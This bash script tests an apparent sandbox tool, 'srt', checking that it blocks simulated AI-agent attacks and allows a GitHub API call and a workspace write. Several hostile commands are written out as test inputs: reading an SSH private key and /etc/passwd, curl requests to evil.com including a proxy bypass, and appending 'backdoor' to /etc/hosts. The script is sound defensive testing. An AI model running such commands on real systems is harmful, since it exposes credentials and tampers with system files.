#!/bin/bash
# SRT Test Scenarios - Demonstrating Security Features

echo "=========================================="
echo "SRT Security Test Scenarios"
echo "=========================================="
echo ""

# Scenario 1: Agent tries to exfiltrate SSH keys
echo "❌ TEST 1: Block SSH key access"
echo "Command: cat ~/.ssh/id_rsa"
srt cat ~/.ssh/id_rsa 2>&1 | head -5
echo ""

# Scenario 2: Agent tries to download malicious payload
echo "❌ TEST 2: Block unapproved network requests"
echo "Command: curl https://evil.com"
srt --settings examples/simple-test.json curl -s https://evil.com 2>&1 | grep -E "(403|Forbidden|blocked)" | head -3
echo ""

# Scenario 3: Agent tries to modify system files
echo "❌ TEST 3: Block system file modification"
echo "Command: echo 'backdoor' > /etc/hosts"
srt sh -c "echo 'backdoor' >> /etc/hosts" 2>&1 | grep -i "operation not permitted"
echo ""

# Scenario 4: Agent performs legitimate API call
echo "✅ TEST 4: Allow legitimate GitHub API access"
echo "Command: curl https://api.github.com/zen"
srt --settings examples/simple-test.json curl -s https://api.github.com/zen
echo ""

# Scenario 5: Agent writes to allowed workspace
echo "✅ TEST 5: Allow workspace file creation"
echo "Command: echo 'agent data' > /tmp/agent-output.txt"
srt --settings examples/simple-test.json sh -c "echo 'Agent completed task successfully' > /tmp/agent-output.txt && cat /tmp/agent-output.txt"
echo ""

# Scenario 6: Python agent tries to access credentials
echo "❌ TEST 6: Block credential file access"
echo "Command: python -c 'open(\"/etc/passwd\", \"r\")'"
srt --settings examples/filesystem-only.json python3 -c "print(open('/etc/passwd', 'r').read())" 2>&1 | grep -i "operation not permitted" || echo "Read succeeded (passwd is public on macOS)"
echo ""

# Scenario 7: Agent tries to use proxy bypass
echo "❌ TEST 7: Network isolation (no proxy bypass)"
echo "Command: curl --noproxy '*' https://evil.com"
srt --settings examples/simple-test.json curl --noproxy '*' -s https://evil.com 2>&1 | grep -E "(403|couldn't resolve|failed)" | head -3
echo ""

echo "=========================================="
echo "All tests complete!"
echo "=========================================="
